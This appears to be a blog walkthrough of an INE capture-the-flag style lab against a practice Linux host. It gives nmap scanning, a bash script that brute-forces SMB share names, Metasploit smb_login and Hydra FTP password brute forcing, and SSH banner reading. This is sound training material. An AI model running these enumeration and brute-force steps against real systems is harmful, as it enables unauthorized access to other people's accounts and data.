
This lab focuses on enumeration techniques to identify and analyze running services on a target Linux machine. The goal is to explore and interact with the machine's services to uncover and capture hidden flags. Participants will apply their knowledge of network and system enumeration to identify misconfigurations, weak credentials, and potential security vulnerabilities.

### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

# Lab Environment

A Linux machine is accessible at **target.ine.local**. Identify the services running on the machine and capture the flags. The flag is an md5 hash format.

- **Flag 1:** There is a samba share that allows anonymous access. Wonder what's in there!
- **Flag 2:** One of the samba users have a bad password. Their private share with the same name as their username is at risk!
- **Flag 3:** Follow the hint given in the previous flag to uncover this one.
- **Flag 4:** This is a warning meant to deter unauthorized users from logging in.

**Note:** The wordlists located in the following directory will be useful:

- /root/Desktop/wordlists

# Tools

- Nmap
- Metasploit
- Hydra
- enum4linux
- smbclient
- smbmap

________________
As the first step, we should start with enumerating services on the target, because it is good to have a solid understanding of our target by examining what services are running. We can use nmap to check the running services on our target.

nmap -Pn -sV -sC -p- target.ine.local

- sV : `show services`
- -Pn : `do not ping`
- -p- : `all ports`
- -sC : `scan with default script`

Once we run the above command, you will be able to see the following output.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*S_K4Lv6XJXjqI7YQ9Gxiqg.png)

Those are the services that are running on the target. Let’s move to find **flag 1.**

**Hint** **1** : “There is a Samba share that allows anonymous access. Wonder what’s in there!”.

The **wordlists** located in the following directory will be useful:

- /root/Desktop/wordlists

So, when you read the hint, you should get the idea that the flag 1 is hidden in a public share that can be accessed anonymously. In addition to that, we have to use the wordlists mentioned in the lab as well.

The contents of the folder /root/Desktop/wordlists are,

- _Unix_passwords.txt_
- _shares.txt_

With all the above information, let’s try to find the share name.

### **1. Enumerating Shares**

We can use the “**_smb_enumshares_** ” module from the Metasploit framework to find the shares associated with the target. But we can’t set a custom wordlist to enumerate the shares of the target. As you can see before, the lab has provided custom wordlists and one of them was to enumerate shares (“_shares.txt_”).

Let me show you what I mentioned earlier using Metasploit. Use the following command to open Metasploit.

msfconsole 

Once the Metasploit is opened, search for the “**_smb_enumshare ”_**module.

search smb_enumshares

After that, select the option.

use 0

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*6IE2cgTTdKN1sLGmYl-KaQ.png)

To check the options, use the following command.

options

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*kBrh_-rScl9p8YNd0K6Duw.png)

I have highlighted the most important options for this module.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*3D-8L776rbGIMieUSJjk8g.png)

But as you can see, there is no option to set a custom word-list. As a solution I have developed the following bash code to obtain matching shares by using a custom wordlist.

#!/bin/bash  
  
# Obtain the target and wordlist from command-line arguments  
target="$1"  
wordlist="$2"  
  
# Check if both arguments are provided  
```
if [ -z "$target" ] || [ -z "$wordlist" ]; then  
    echo "Usage: $0 <target> <wordlist>"  
    exit 1  
fi  
  
# Check if the wordlist file exists  
if [ ! -f "$wordlist" ]; then  
    echo "Error: Wordlist file '$wordlist' not found."  
    exit 1  
fi  
  
# Initialize an array to store successful shares  
successful_shares=()  
  
# Loop through each share in the wordlist  
while read -r share; do  
    echo -e "Testing share: \e[34m$share\e[0m"  
    smbclient "//$target/$share" -N -c "ls" &>/dev/null  
  
    if [ $? -eq 0 ]; then  
        successful_shares+=("$share")  
    fi  
done < "$wordlist"  
  
# Output the results  
if [ ${#successful_shares[@]} -gt 0 ]; then  
    echo -e "\n\e[32m[+] Successfully accessed shares:\e[0m"  
    for share in "${successful_shares[@]}"; do  
        echo -e "\e[32m[+] \e[34m$share\e[0m"  
    done  
else  
    echo -e "\e[31m[-] No accessible shares found.\e[0m"  
fi  
  
echo -e "\n[+] SMB enumeration completed."
```

First you need to create a bash file using the above code. After that you have to make the file executable. For this purpose I’m going to create a bash file called “smbenumshare.sh”. [.**sh** is the extension of a bash file]

nano smbenumshares.sh

![](https://miro.medium.com/v2/resize:fit:359/1*iGiQn4K7Dg0EGsAbbJzyKw.png)

After that you will be able to see an empty space as shown below.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*W-4K6BJPWi55JrKG2wZV3g.png)

Please read the **INE instructions** on how to copy the code to your lab.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*-ze8sCoxOewup_oEj1skOQ.png)

After following the above instructions, paste the code to the terminal by using following shortcut: **CTRL+ SHIFT + V**.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*LklcZWW1SW9Gc0VXmJsPDQ.png)

After that, to write & save the file, press **“CTRL + O”.** Then you will be seeing the following prompt: “File Name to Write”.

![](https://miro.medium.com/v2/resize:fit:753/1*Wm07TZt9Wzpq46tWshbbRg.png)

After that, press **ENTER,** then “**CTRL + X”** to exit.

After that we have to make the file executable because the file doesn't have the executable rights.

![](https://miro.medium.com/v2/resize:fit:770/1*mxk7XHLz8PHusFIWF9OQbg.png)

To make the file executable, you can use the following command.

chmod +x smbenumshare.sh

And after that you can see now the file has executable rights.

![](https://miro.medium.com/v2/resize:fit:735/1*KOfrCxyVybalsCJHVsKFfw.png)

Now you can execute the file as follows.

./smbenumshare.sh target.ine.local /root/Desktop/wordlists/shares.txt

And the results will be shown as follows.

![](https://miro.medium.com/v2/resize:fit:511/1*7gBqgOz_i3BGAmBn1rLHpQ.png)

Finally, we were able to find the public share that can be accessed anonymously using a custom wordlist.

Let’s try to find the flag on “**_pubfiles_**”. To log in to the share and download the flag, you can use the following commands.

smbclient \\\\target.ine.local\\pubfiles  
  
get flag1.txt

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*ebClUOKSvaIai6ab8On2Dg.png)

Let’s move to find **flag 2.**

Hint 2 : “One of the samba users have a bad password. Their private share with the same name as their username is at risk!”

So, basically that means we have to find the users who have access to these SMB shares. For this we can use **enum4linux**.

### 2. **Enumerating user credentials**

We can use enum4linux to obtain detailed information about the shares and their access permissions.

enum4linux -a target.ine.local

In the results, there are few users mentioned.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*cs4JXSmFAg4RQyuPQPQpEQ.png)

We can create a file by including the following usernames as users.txt. After that we can brute force the credentials using **smb_login** module in Metasploit. Start Metasploit and use the smb_login module.

msfconsole  
  
use auxiliary/scanner/smb/smb_login  
  
set RHOSTS target.ine.local  
  
set USER_FILE /root/Desktop/users.txt  
  
set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt  
  
set VERBOSE false

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*O8x_zixFK088rhhTpYtEpA.png)

Let’s try to login and see from which user we can obtain the flag.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*w8yMPcltnB5GzAtK-s5Hyg.png)

So, as you can see, the flag 2 was hidden in josh’s account. Let’s move to find **flag 3.**

**Hint 3** : “ Follow the hint given in the previous flag to uncover this one.”

Let’s check the **2nd flag** and see what this is about.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*JqmXvhJtKL57uFtGihzITw.png)

### 3. **Brute Force FTP service**

We need to brute force the ftp service and check whether we can find any credentials or not. for this process I’m going to use **Hydra**.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*Z71nWLzLpuypZBi9SbRzng.png)

Since the ftp service is running on port 5554, (**-s** = port number)

hydra -L /root/Desktop/users.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://target.ine.local -s 5554

Then you will be able to see the credentials for “alice”.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*VX78z7meazNhWRigfHyX6Q.png)

Let’s login to ftp service using Alice’s credentials. Then you will be able to see the **flag 3**.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*Hm3rZ5jgxUtgupPobztRDQ.png)

Let’s move to find the **last flag**.

Hint 4 : “**This is a warning meant to deter unauthorized users from logging in.**”

### 4. **SSH**

This must be related to one of the services running on the target system. So there is only one service we didn't touch. That is ssh. Let’s try to login without any credentials.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*o-X3gFfkC3kABfV3G-ejQA.png)

As you can see, we found the **last flag** as well.

**_Hope everyone can understand and have a great day!!!_**